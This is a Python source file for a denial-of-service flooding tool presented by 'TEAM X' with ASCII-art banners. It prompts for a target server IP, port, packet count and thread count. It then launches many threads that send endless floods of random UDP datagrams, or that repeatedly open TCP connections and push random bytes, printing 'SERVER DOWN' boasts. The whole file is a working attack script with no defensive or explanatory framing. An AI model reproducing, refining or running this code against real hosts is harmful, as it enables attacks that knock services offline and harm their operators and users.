import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM X is Presenting to you :


████████╗███████╗░█████╗░███╗░░░███╗  ██╗░░██╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ╚██╗██╔╝
░░░██║░░░█████╗░░███████║██╔████╔██║  ░╚███╔╝░
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░██╔██╗░
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██╔╝╚██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

Created by Kill4Life

	""")
else :
	print("""
 TEAM X is Presenting to you :


┏━━━━┳━━━┳━━━┳━┓┏━┓┏━┓┏━┓
┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃┗┓┗┛┏┛
┗┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃╋┗┓┏┛
╋╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃╋┏┛┗┓
╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃┏┛┏┓┗┓
╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛┗━┛┗━┛
┏━━━┳━━━┓╋╋┏━━━┓
┗┓┏┓┣┓┏┓┃╋╋┃┏━┓┃
╋┃┃┃┃┃┃┃┣━━┫┗━━┓
╋┃┃┃┃┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┣┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━━┻━━┻━━━┛
┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓
┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃
┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┓
┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┛
┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┓
┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┛
		""")


print("DDos")
ip= str(input("                   X Server ip X :"))
port= int(input("                   X port X :"))
choice = str(input("                   X DDoS Attack?? (y/n) X :"))
times= int(input("                   X Paket X :"))
threads= int(input("                   X threads X :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()